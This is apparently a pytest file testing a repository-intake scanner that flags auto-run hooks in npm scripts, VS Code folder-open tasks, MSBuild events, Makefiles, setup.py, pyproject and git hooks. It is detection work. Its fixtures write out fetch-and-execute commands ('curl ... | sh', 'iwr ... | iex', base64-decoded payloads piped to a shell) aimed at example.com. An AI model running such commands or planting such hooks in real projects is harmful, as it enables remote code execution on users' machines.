"""Repo intake, item 1: auto-run hooks. Fixtures are benign strings made at test time; nothing is fetched or run."""
import pytest

from code_guardian import intake, intake_rules as R
from intake_helpers import mk, of


def scan(tmp_path, files):
    return intake.scan(mk(tmp_path / "repo", files))


# ---- the shared command classifier ---------------------------------------------------------------------------------

@pytest.mark.parametrize("cmd, kind", [
    ("curl -s https://example.com/x.sh | sh", "fetch_exec"),
    ("wget -qO- https://example.com/x | sudo bash -s", "fetch_exec"),
    ('powershell -nop -c "iwr https://example.com/a.ps1 | iex"', "fetch_exec"),
    ("curl -o x https://example.com/x && chmod +x x && ./x", "fetch_exec"),
    ("powershell -enc " + "A" * 40, "obfuscated_exec"),
    ("echo " + "QUJD" * 12 + " | base64 -d | sh", "obfuscated_exec"),
    ("node -e \"require('child_process').exec('id')\"", "inline_exec"),
    ("python3 -c \"import os\"", "inline_exec"),
    ("curl -L https://example.com/data.json -o data.json", "fetch_only"),
    ("node scripts/postinstall.js", "local_script"),
    ("husky install", None), ("node-gyp rebuild", None), ("tsc -p .", None), ("npm run build", None), ("echo hi", None),
])
def test_command_signal(cmd, kind):
    assert R.command_signal(cmd) == kind


# ---- npm lifecycle scripts -----------------------------------------------------------------------------------------

def pkg(**scripts):
    body = ",\n".join('    "%s": "%s"' % (k, v.replace('"', '\\"')) for k, v in scripts.items())
    return '{\n  "name": "x",\n  "scripts": {\n%s\n  }\n}\n' % body


def test_npm_lifecycle_fetch_and_exec_is_high_with_file_line_and_match(tmp_path):
    res = scan(tmp_path, {"package.json": pkg(postinstall="curl -s https://example.com/x.sh | sh")})
    (f,) = of(res, "hook.npm_lifecycle")
    assert (f["confidence"], f["file"], f["line"]) == ("high", "package.json", 4)
    assert f["match"] == "postinstall: curl -s https://example.com/x.sh | sh"
    assert res["verdict"]["level"] == "suspicious"


def test_npm_lifecycle_levels_and_the_benign_ones_stay_quiet(tmp_path):
    res = scan(tmp_path, {
        "a/package.json": pkg(preinstall="node -e \"console.log(1)\""),
        "b/package.json": pkg(install="node scripts/setup.js"),
        "c/package.json": pkg(prepare="husky install", postinstall="node-gyp rebuild", build="curl https://example.com | sh"),
        "d/package.json": pkg(prepare="curl -L https://example.com/d.json -o d.json"),
    })
    got = {f["file"]: f["confidence"] for f in of(res, "hook.npm_lifecycle")}
    assert got == {"a/package.json": "medium", "b/package.json": "low", "d/package.json": "medium"}


def test_a_broken_package_json_is_skipped_not_a_crash(tmp_path):
    res = scan(tmp_path, {"package.json": "{ not json"})
    assert res["findings"] == [] and res["check_errors"] == []


# ---- .vscode tasks that run when the folder opens ------------------------------------------------------------------

TASKS = """{
  // comment, as VS Code allows
  "version": "2.0.0",
  "tasks": [
    {
      "label": "go",
      "type": "shell",
      "command": "%s",
      "runOptions": { "runOn": "folderOpen" },
    },
  ]
}
"""


def test_vscode_folder_open_task_levels(tmp_path):
    res = scan(tmp_path, {
        "a/.vscode/tasks.json": TASKS % "curl -s https://example.com/x | sh",
        "b/.vscode/tasks.json": TASKS % "echo hello",
        "c/.vscode/tasks.json": TASKS.replace("folderOpen", "default") % "echo hello",
    })
    got = {f["file"]: (f["confidence"], f["line"]) for f in of(res, "hook.vscode_folder_open")}
    assert got == {"a/.vscode/tasks.json": ("high", 9), "b/.vscode/tasks.json": ("medium", 9)}
    assert "curl -s https://example.com/x | sh" in of(res, "hook.vscode_folder_open")[0]["match"]


def test_vscode_task_hidden_from_view_with_an_exec_is_high(tmp_path):
    t = TASKS.replace('"type": "shell",', '"type": "shell", "presentation": {"reveal": "never"},') % "node -e 1"
    (f,) = of(scan(tmp_path, {".vscode/tasks.json": t}), "hook.vscode_folder_open")
    assert f["confidence"] == "high"


# ---- MSBuild / csproj ----------------------------------------------------------------------------------------------

CSPROJ = """<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <PreBuildEvent>%s</PreBuildEvent>
  </PropertyGroup>
  <Target Name="T" AfterTargets="Build">
    <Exec Command="%s" />
  </Target>
</Project>
"""


def test_msbuild_events(tmp_path):
    res = scan(tmp_path, {
        "a/App.csproj": CSPROJ % ("powershell -enc " + "A" * 40, "echo done"),
        "b/App.csproj": CSPROJ % ("curl -s https://example.com/a.exe -o a.exe &amp;&amp; a.exe", "copy a b"),
        "c/App.csproj": CSPROJ % ("xcopy /y a b", "dotnet tool restore"),
    })
    got = sorted((f["file"], f["line"], f["confidence"]) for f in of(res, "hook.msbuild_exec"))
    assert got == [("a/App.csproj", 3, "high"), ("b/App.csproj", 3, "high")]
    assert "&&" in [f for f in of(res, "hook.msbuild_exec") if f["file"].startswith("b")][0]["match"], "entities decoded"


def test_msbuild_inline_task_is_medium(tmp_path):
    t = '<Project>\n  <UsingTask TaskName="X" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="a.dll">\n  </UsingTask>\n</Project>\n'
    (f,) = of(scan(tmp_path, {"x.targets": t}), "hook.msbuild_exec")
    assert f["confidence"] == "medium" and f["line"] == 2


# ---- Makefile, setup.py, pyproject, git hooks ----------------------------------------------------------------------

def test_makefile_fetch_and_exec(tmp_path):
    mf = "all:\n\tcurl -s https://example.com/i.sh \\\n\t  | sh\n\nfetch:\n\twget https://example.com/d.tgz\n\nok:\n\tgcc -o a a.c\n"
    res = scan(tmp_path, {"Makefile": mf})
    got = [(f["confidence"], f["line"]) for f in of(res, "hook.makefile_fetch_exec")]
    assert got == [("high", 2), ("low", 6)]
    assert "| sh" in of(res, "hook.makefile_fetch_exec")[0]["match"], "continued lines are joined"


def test_setup_py_levels(tmp_path):
    res = scan(tmp_path, {
        "a/setup.py": "import urllib.request, os\nurllib.request.urlopen('https://example.com/x')\nos.system('sh x')\n",
        "b/setup.py": "import urllib.request\ndata = urllib.request.urlopen('https://example.com/x').read()\n",
        "c/setup.py": "import subprocess\nv = subprocess.check_output(['git', 'describe'])\n",
        "d/setup.py": "from setuptools import setup\nsetup(name='x')\n",
        "e/setup.py": "def (:\n",
    })
    got = {f["file"]: (f["confidence"], f["line"]) for f in of(res, "hook.setup_exec")}
    assert got == {"a/setup.py": ("high", 2), "b/setup.py": ("medium", 2), "c/setup.py": ("low", 2)}


def test_pyproject_in_tree_backend_and_url_requirements(tmp_path):
    ok = '[build-system]\nrequires = ["setuptools>=61"]\nbuild-backend = "setuptools.build_meta"\n'
    local = '[build-system]\nrequires = []\nbuild-backend = "mybuild"\nbackend-path = ["tools"]\n'
    url = '[build-system]\nrequires = ["helper @ https://example.com/h.zip"]\nbuild-backend = "setuptools.build_meta"\n'
    res = scan(tmp_path, {"a/pyproject.toml": ok, "b/pyproject.toml": local, "c/pyproject.toml": url})
    got = {f["file"]: f["confidence"] for f in of(res, "hook.build_backend_local")}
    assert got == {"b/pyproject.toml": "medium", "c/pyproject.toml": "medium"}


def test_shipped_git_hooks(tmp_path):
    res = scan(tmp_path, {
        ".githooks/pre-commit": "#!/bin/sh\ncurl -s https://example.com/h | sh\n",
        ".husky/pre-push": "#!/bin/sh\nnpm test\n",
        ".git/hooks/post-checkout": "#!/bin/sh\necho hi\n",
        ".git/hooks/pre-commit.sample": "#!/bin/sh\ncurl https://example.com | sh\n",
    })
    got = {f["file"]: f["confidence"] for f in of(res, "hook.git_hooks")}
    assert got == {".githooks/pre-commit": "high", ".husky/pre-push": "low", ".git/hooks/post-checkout": "medium"}
